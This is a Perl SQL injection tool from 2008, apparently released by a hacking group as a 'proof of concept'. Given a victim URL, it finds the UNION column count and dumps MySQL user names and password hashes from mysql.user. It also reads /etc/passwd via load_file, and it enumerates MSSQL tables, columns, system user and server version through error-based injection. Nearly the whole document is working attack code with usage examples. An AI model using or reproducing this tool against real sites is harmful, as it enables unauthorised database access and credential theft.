# SQL-0xh0 v1.0 #2008-noV, the first public version.
# released: 10-2008.
#
# Written by JosS <sys-project[at]hotmail.com>
# Spanish Hackers Team && Hack0wn rlz!!
#
# Script in perl of proof of concept.
#
# Features:
#  MYSQL:
#        number of columns
#        verify user of mysql
#        verify password of mysql
#        check load_file() fuction
#  MSSQL:
#        names of columns and tables
#        DB name
#        system user
#        server name
#        version database
#
# Examples uses:
#  For MYSQL database:
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.php?id=1485" -set 15 -database 0
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.php?id=-1485" -set 15 -database 0
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.php?id='1485" -set 15 -database 0
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.php?id=1485+and+1=2" -set 15 -database 0
#  For MSSQL database:
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.asp?id=1" -database 1
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.asp?id=1'" -database 1
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.asp?id=1--'" -database 1
#      joss@h4x0rz:~/Desktop$ perl h0.pl -url "http://h0/news.asp?id=-1" -database 1
#  Screen help:
#      joss@h4x0rz:~/Desktop$ perl h0.pl -help
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;


system(($^O eq 'MSWin32') ? 'cls' : 'clear');

sub banner {
	print "[x] SQL-0xh0 v1.0 #2008-nov\n";
	print "[x] Written By JosS of SHT & Hack0wn\n";
	print "[x] sys-project[at]hotmail[dot]com\n\n";
}

my $options = GetOptions (
  'help!'            => \$help, 
  'url=s'            => \$url,
  'set=s'            => \$set,
  'database=s'		 => \$database
  );

&help unless ($url);
&help if $help eq 1;

if (!defined($set)){
$set=30;
}
if (!defined($database)){
$database=0;
}

######### MYSQL #########

if ($database == 0)
{

my $global_uid;
my $global_uid2;

# column finder #
&find_column;
sub find_column{
$var="CHAR(74,111,115,83)";
chomp ($var);
$i=0;
$accountant=1;
my @count;

print "Wait... [looking for number of columns]\n";
while ($i <= $set)
{
push(@count,$var);

@counts=join(",",@count);
foreach $uid (@counts)
{
my $final = $url."+union+all+select+".$uid."/*";
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;
if ($doc =~ /JosS/){
$global_uid = $uid;  # for others subrutines
$global_uid2 = $uid; # for others subrutines
$uid =~ s/CHAR\(74,111,115,83\)/1/g;
print "Columns Found: $accountant\n";
print $url."+union+all+select+".$uid."/*\n";
goto mysql_user;} # siguiente chequeo
$accountant++;
}

$i++;
}
}
print "Unable to find the number of columns, exit\n";
exit;

# mysql.user #
mysql_user:;
&mysql_user;
sub mysql_user{
print "\nWait... [Verifying mysql_user]\n";
my $final = $url."+union+all+select+".$global_uid."+from+mysql.user/*";
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;
if ($doc =~ /JosS/){
$global_uid =~ s/CHAR\(74,111,115,83\)/concat\(char\(58\),char\(58\),user,CHAR\(95\),CHAR\(95\),password,char\(58\),char\(58\)\)/g;
my $final = $url."+union+all+select+".$global_uid."+from+mysql.user/*";
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;
$user = $1 if ( $doc =~ m/::(.*?)__/mosix);
if ($user=="")
{
print "User mysql: not found!\n"
}
else{
print "User mysql: $user\n";
}
$password = $1 if ( $doc =~ m/__(.*?)::/mosix);
if ($password=="")
{
print "Password mysql: not found!\n"
}
else{
print "Password mysql: $password\n";
}
}
}

# load_file #
&load_file;
sub load_file{
print "\n";
$global_uid2 =~ s/CHAR\(74,111,115,83\)/concat\(char\(58\),char\(58\),char\(58\),load_file\(0x2f6574632f706173737764\),char\(58\),char\(58\),char\(58\)\)/g;
my $final = $url."+union+all+select+".$global_uid2."/*";
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;
$etc_passwd = $1 if ( $doc =~ m/:::(.*?):::/mosix) or die "Can't read file: etc_passwd\n";
print "etc_passwd:\n $etc_passwd\n\n";
}

exit(1);
}

######### MSSQL #########

if ($database == 1)
{

my @tables;
my @columns;

# column finder #
&find_column_mssql;
sub find_column_mssql{

print "Wait... [looking for names of columns and tables]\n";
$iny='+having+1=1--';
$by='+group+by';
my $down=0;

my $final = $url.$iny;
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;
if($doc =~ m/Column \'(.*?)\' is/g)
{
$by .= "+".$1;
($table, $column) = $doc =~ m/\'(\w+)\.(\w+)\'/simo;
push (@tables,$table);
push (@columns,$column);
while($down==0)
{
my $final = $url.$by.$iny;
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;
if($doc =~ m/Column \'(.*?)\' is/g){
$by .= ",".$1;
($table, $column) = $doc =~ m/\'(\w+)\.(\w+)\'/simo;
push (@tables,$table);
push (@columns,$column);
}
else{
$down=1;
}
}
@tables2=join(",",@tables);
foreach $tables (@tables2)
{
 print "Tables: $tables";
}
print "\n";
@columns2=join(",",@columns);
foreach $columns (@columns2)
{
 print "Columns: $columns";
}
print "\n";
}
else{
print "Not columns found\n";
}
}

# Informations server #
&informations_server_mssql;
sub informations_server_mssql{
print "\n";
print "Wait... [looking for names of columns and tables]\n";

@commands=("1+and+1=convert(int,db_name())","1+and+1=convert(int,system_user)","1+and+1=convert(int,\@\@servername)--","1+and+1=convert(int,\@\@version)--");

for ($i=0;$i<=3;$i++)
{
my $final = $url.$commands[$i];
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new(GET => $final);
$doc = $ua->request($req)->as_string;


if ( $doc =~ /Syntax\s(.*)<\/font>/mosix )
{
if ($commands[$i] eq "1+and+1=convert(int,db_name())")
{
print "db_name: "; 
$dbname = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print "$dbname\n";
}
if ($commands[$i] eq "1+and+1=convert(int,system_user)")
{
print "system_user: ";
$systemuser = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print "$systemuser\n";
}
if ($commands[$i] eq "1+and+1=convert(int,\@\@servername)--")
{
print "servername: ";
$servername = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print "$servername\n";

}
if ($commands[$i] eq "1+and+1=convert(int,\@\@version)--")
{
print "version: ";
$version = $1 if ($doc =~ /.*value\s'(.*)'\sto.*/);
print "$version\n\n";
}
}
} 
}

exit(1);
}


sub help {
	&banner();
	print "\n -----------------------------options:-----------------------------\n";
	print " -url:\t\tUrl Victim, Ex: http://localhost/index.php?id=-15\n"; 
	print " -set: \t\tIf Maximum number of columns to search [30], Ex: 25\n";
        print " -database:\tBackend database:\n";
	print " \t0:\tMYSQL [default]\n";
	print " \t1:\tMS-SQL\n\n";
    exit(1);
}

# EOF - brotha, rlzz! :D

